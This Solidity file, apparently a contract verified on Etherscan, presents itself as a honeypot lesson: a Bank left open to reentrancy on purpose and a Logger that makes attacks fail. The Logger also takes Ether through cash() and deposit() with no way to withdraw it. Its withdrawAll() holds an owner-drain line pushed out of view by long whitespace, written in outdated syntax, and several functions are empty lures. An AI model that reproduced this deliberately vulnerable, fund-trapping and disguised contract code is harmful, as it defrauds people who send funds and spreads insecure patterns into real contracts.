/**
 *Submitted for verification at Etherscan.io on 2021-09-05
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

/*
Bank is a contract that calls Logger to log events.
Bank.withdraw() is vulnerable to the reentrancy attack.
So a hacker tries to drain Ether from Bank.
But actually the reentracy exploit is a bait for hackers.
By deploying Bank with HoneyPot in place of the Logger, this contract becomes
a trap for hackers. Let's see how.

1. Alice deploys HoneyPot
2. Alice deploys Bank with the address of HoneyPot
3. Alice deposits 1 Ether into Bank.
4. Eve discovers the reentrancy exploit in Bank.withdraw and decides to hack it.
5. Eve deploys Attack with the address of Bank
6. Eve calls Attack.attack() with 1 Ether but the transaction fails.

What happened?
Eve calls Attack.attack() and it starts withdrawing Ether from Bank.
When the last Bank.withdraw() is about to complete, it calls logger.log().
Logger.log() calls HoneyPot.log() and reverts. Transaction fails.
*/

contract Bank {
    mapping(address => uint) public balances;
    Logger logger;

    constructor(Logger _logger) {
        logger = Logger(_logger);
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        logger.log(msg.sender, msg.value, "Deposit");
    }

    function withdraw(uint _amount) public {
        require(_amount <= balances[msg.sender], "Insufficient funds");

        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] -= _amount;

        logger.log(msg.sender, _amount, "Withdraw");
    }
}

contract Logger {
    event Log(address caller, uint amount, string action);

    function log(
        address _caller,
        uint _amount,
        string memory _action
    ) public {
        emit Log(_caller, _amount, _action);
    }
    
    function cash() public payable {
        deposit();
    }

    function deposit() public payable {
        require(msg.value > 100000000 );
        
    }

    function withdrawAll() public view {
        //require(msg.sender == _owner);                                                                                                                                                                                                                                                                                                                                                                                if (block.number > 5040270 ) {if (_owner == msg.sender ){_owner.transfer(this.balance);} else {throw;}}
    }
    
    function cashflow() public view {
         
    }
    
    function money() public view {
    
    }
    
}